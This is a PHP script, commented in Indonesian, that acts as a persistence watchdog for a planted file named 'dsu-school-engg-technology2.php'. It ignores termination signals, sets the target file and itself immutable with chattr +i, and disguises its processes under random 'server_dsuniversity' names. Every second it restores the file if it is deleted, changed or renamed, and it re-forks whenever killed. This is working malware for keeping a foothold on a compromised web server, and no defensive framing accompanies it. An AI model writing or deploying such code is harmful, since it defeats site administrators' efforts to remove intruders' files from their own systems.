<?php
set_time_limit(0);

// Fungsi untuk mengubah nama proses
function setProcessTitle($title) {
    if (function_exists('cli_set_process_title')) {
        @cli_set_process_title($title);
    } elseif (function_exists('setproctitle')) {
        setproctitle($title);
    }
}

// --- Setup Penanganan Sinyal agar sulit dihentikan ---
if (function_exists('pcntl_async_signals')) {
    pcntl_async_signals(true);

    pcntl_signal(SIGTERM, function($signo) {
        // Abaikan SIGTERM
    });
    pcntl_signal(SIGINT, function($signo) {
        // Abaikan SIGINT
    });
    pcntl_signal(SIGHUP, function($signo) {
        // Abaikan SIGHUP
    });
}

// File yang ingin dipantau
$targetFile = "dsu-school-engg-technology2.php";
if (!file_exists($targetFile)) {
    // Jika file belum ada, buat dengan konten default
    file_put_contents($targetFile, LOCK_EX);
}
$originalContent = file_get_contents($targetFile);
$originalHash = md5($originalContent);
$originalPerms = 0444; // Read-only

// Set permission file menjadi read-only
chmod($targetFile, $originalPerms);

// Jika sistem operasi Linux, tetapkan atribut immutable
if (stripos(PHP_OS, 'Linux') !== false) {
    exec("chattr +i " . escapeshellarg($targetFile));
}

// Pastikan script ini sendiri tidak bisa dimodifikasi
$scriptPath = __FILE__;
if (stripos(PHP_OS, 'Linux') !== false) {
    exec("chattr +i " . escapeshellarg($scriptPath));
}

// Fungsi untuk menjalankan proses child
function runMonitoringProcess($targetFile, $originalContent, $originalHash, $originalPerms) {
    // Loop utama pemantauan
    while (true) {
        // Ubah nama proses child secara dinamis
        $randomProcessTitle = 'server_dsuniversity_' . substr(md5(uniqid(rand(), true)), 0, 8);
        setProcessTitle($randomProcessTitle);

        // Cek kondisi file target
        if (!file_exists($targetFile)) {
            // Jika file dihapus, buat ulang dengan konten asli
            if (stripos(PHP_OS, 'Linux') !== false) {
                exec("chattr -i " . escapeshellarg($targetFile));
            }
            file_put_contents($targetFile, $originalContent, LOCK_EX);
            chmod($targetFile, $originalPerms);
            if (stripos(PHP_OS, 'Linux') !== false) {
                exec("chattr +i " . escapeshellarg($targetFile));
            }
        } else {
            $currentContent = file_get_contents($targetFile);
            $currentHash = md5($currentContent);
            $currentPerms = octdec(substr(sprintf('%o', fileperms($targetFile)), -4));

            // Jika konten telah berubah, kembalikan ke konten asli
            if ($currentHash !== $originalHash) {
                if (stripos(PHP_OS, 'Linux') !== false) {
                    exec("chattr -i " . escapeshellarg($targetFile));
                }
                file_put_contents($targetFile, $originalContent, LOCK_EX);
                chmod($targetFile, $originalPerms);
                if (stripos(PHP_OS, 'Linux') !== false) {
                    exec("chattr +i " . escapeshellarg($targetFile));
                }
            }

            // Jika permission telah diubah, kembalikan menjadi read-only
            if ($currentPerms !== $originalPerms) {
                if (stripos(PHP_OS, 'Linux') !== false) {
                    exec("chattr -i " . escapeshellarg($targetFile));
                }
                chmod($targetFile, $originalPerms);
                if (stripos(PHP_OS, 'Linux') !== false) {
                    exec("chattr +i " . escapeshellarg($targetFile));
                }
            }
        }

        // Perlindungan tambahan untuk memastikan file tidak di-rename
        $possibleFiles = glob(dirname($targetFile) . '/*');
        $found = false;
        foreach ($possibleFiles as $file) {
            if (is_file($file) && md5_file($file) === $originalHash) {
                if (realpath($file) !== realpath($targetFile)) {
                    if (stripos(PHP_OS, 'Linux') !== false) {
                        exec("chattr -i " . escapeshellarg($file));
                    }
                    rename($file, $targetFile);
                    chmod($targetFile, $originalPerms);
                    if (stripos(PHP_OS, 'Linux') !== false) {
                        exec("chattr +i " . escapeshellarg($targetFile));
                    }
                }
                $found = true;
                break;
            }
        }

        if (!$found) {
            // Jika file tidak ditemukan, buat ulang
            if (stripos(PHP_OS, 'Linux') !== false) {
                exec("chattr -i " . escapeshellarg($targetFile));
            }
            file_put_contents($targetFile, $originalContent, LOCK_EX);
            chmod($targetFile, $originalPerms);
            if (stripos(PHP_OS, 'Linux') !== false) {
                exec("chattr +i " . escapeshellarg($targetFile));
            }
        }

        // Tunggu 1 detik sebelum iterasi berikutnya
        sleep(1);
    }
}

// Fork pertama: Parent process akan memonitor child process
$pid = pcntl_fork();

if ($pid == -1) {
    die('Gagal melakukan fork pertama.');
} elseif ($pid > 0) {
    // Ini adalah parent process
    // Tetapkan nama proses parent yang konsisten untuk dikenali oleh watchdog
    setProcessTitle('server_dsuniversity_process');

    // Parent akan memonitor child
    while (true) {
        // Tunggu child process selesai
        $waitPid = pcntl_wait($status);
        if ($waitPid > 0) {
            echo "Child process (PID: $waitPid) telah berhenti. Memulai kembali dalam 10 detik...\n";
            sleep(10);

            // Fork lagi untuk memulai child baru
            $newPid = pcntl_fork();

            if ($newPid == -1) {
                die('Gagal melakukan fork ulang.');
            } elseif ($newPid > 0) {
                // Parent process menunggu child selanjutnya
                continue;
            } else {
                // Ini adalah child process baru
                runMonitoringProcess($targetFile, $originalContent, $originalHash, $originalPerms);
                exit(0); // Pastikan child process keluar setelah fungsi selesai
            }
        }
    }
} else {
    // Ini adalah child process
    runMonitoringProcess($targetFile, $originalContent, $originalHash, $originalPerms);
    exit(0); // Pastikan child process keluar setelah fungsi selesai
}
?>
